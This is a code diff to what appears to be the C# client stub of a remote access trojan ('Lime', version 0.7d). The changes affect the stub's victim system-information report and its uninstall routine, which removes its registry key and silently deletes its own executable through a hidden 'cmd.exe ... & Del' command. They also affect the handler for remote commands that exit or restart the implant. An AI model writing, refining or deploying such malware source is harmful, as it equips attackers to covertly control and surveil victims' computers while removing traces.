@@ -43,7 +43,7 @@ namespace Lime
 
         public static string version = "0.7d";
 
-        public static object stubMutex = null;
+        public static Mutex stubMutex = null;
 
         public static FileInfo currentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
 
@@ -206,7 +206,7 @@ namespace Lime
             }
             catch
             {
-                text = text + "??" + splitter;
+                text = text + "N/A" + splitter;
             }
             try
             {
@@ -214,7 +214,7 @@ namespace Lime
             }
             catch
             {
-                text = text + "??" + splitter;
+                text = text + "N/A" + splitter;
             }
             try
             {
@@ -222,16 +222,16 @@ namespace Lime
             }
             catch
             {
-                text = text + "??-??-??" + splitter;
+                text = text + "N/A" + splitter;
             }
             text = text + "" + splitter;
             try
             {
-                text += new Computer().Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
+                text += new Computer().Info.OSFullName;
             }
             catch
             {
-                text += "??";
+                text += "N/A";
             }
             text += "SP";
             checked
@@ -433,19 +433,21 @@ namespace Lime
         {
             try
             {
-                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(registryName, false);
-            }
-            catch (Exception expr_10F)
-            {
-                ProjectData.SetProjectError(expr_10F);
-                ProjectData.ClearProjectError();
-            }
-            try
-            {
-                Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + currentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
+                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKeyTree(registryName);
             }
             catch { }
-            ProjectData.EndApp();
+
+            try
+            {
+                Interaction.Shell("cmd.exe /C Y /N /D Y /T 1 & Del \"" + currentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
+            }
+            catch { }
+            try
+            {
+                stubMutex.Close();
+            }
+            catch { }
+            Environment.Exit(0);
         }
 
         public static void HandleData(byte[] b)
@@ -703,12 +705,22 @@ namespace Lime
                             }
                             else if (Operators.CompareString(left4, "!", false) == 0)
                             {
-                                ProjectData.EndApp();
+                                try
+                                {
+                                    stubMutex.Close();
+                                }
+                                catch { }
+                                Environment.Exit(0);
                             }
                             else if (Operators.CompareString(left4, "@", false) == 0)
                             {
                                 Process.Start(currentAssemblyFileInfo.FullName);
-                                ProjectData.EndApp();
+                                try
+                                {
+                                    stubMutex.Close();
+                                }
+                                catch { }
+                                Environment.Exit(0);
                             }
                         }
                         else if (Operators.CompareString(left, "up", false) == 0)
@@ -958,8 +970,8 @@ namespace Lime
                             port,
                             "\r\n"
                         });
-                        text = text + "" + "\r\n";
-                        text = text + "" + "\r\n";
+                        text = text + currentAssemblyFileInfo.Directory + "\r\n";
+                        text = text + currentAssemblyFileInfo.Name + "\r\n";
                         text = text + "" + "\r\n";
                         text = text + "" + "\r\n";
                         text = text + "" + "\r\n";
